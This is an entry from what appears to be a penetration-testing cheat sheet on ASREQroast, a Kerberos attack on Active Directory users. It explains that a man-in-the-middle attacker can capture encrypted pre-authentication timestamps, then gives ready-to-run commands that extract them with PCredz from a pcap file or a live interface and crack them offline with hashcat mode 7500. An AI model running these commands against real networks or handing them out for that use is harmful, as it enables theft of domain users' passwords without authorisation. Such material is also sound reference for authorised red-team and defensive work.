---
technique: ASREQroast
category: kerberos
targets: Domain users authenticating via Kerberos
protocols: Kerberos
remote_capable: false
tags: kerberos asreqroast mitm preauth timestamp cracking ad
---

# ASREQroast

During Kerberos pre-authentication, clients encrypt a timestamp with their password-derived key and send it in an AS-REQ message. An attacker with a man-in-the-middle position can capture those encrypted timestamps and crack them offline to recover plaintext passwords. Unlike ASREProast, this technique requires no account misconfiguration, only a sufficient MitM position (ARP poisoning, ICMP redirect, DHCPv6 spoofing, etc.).

## Linux

### PCredz (pcap)

#pcap #credential-extraction

Extract Kerberos AS-REQ pre-auth timestamps from a captured pcap file.

```sh title:"Extract AS-REQ pre-auth timestamps from pcap"
Pcredz -f "$pcap_file"
```
<!-- cheat
var pcap_file
-->

### PCredz (live)

#live-capture #interface

Capture and extract Kerberos pre-auth timestamps in real time from a network interface.

```sh title:"Live capture of AS-REQ pre-auth timestamps from interface"
Pcredz -i "$interface" -v
```
<!-- cheat
var interface
-->

### hashcat

#cracking #offline

Crack captured AS-REQ pre-auth timestamps with hashcat mode 7500.

```sh title:"Crack Kerberos pre-auth timestamps with hashcat"
hashcat -m 7500 -a 0 "$hashes_file" "$wordlist"
```
<!-- cheat
var hashes_file
var wordlist
-->
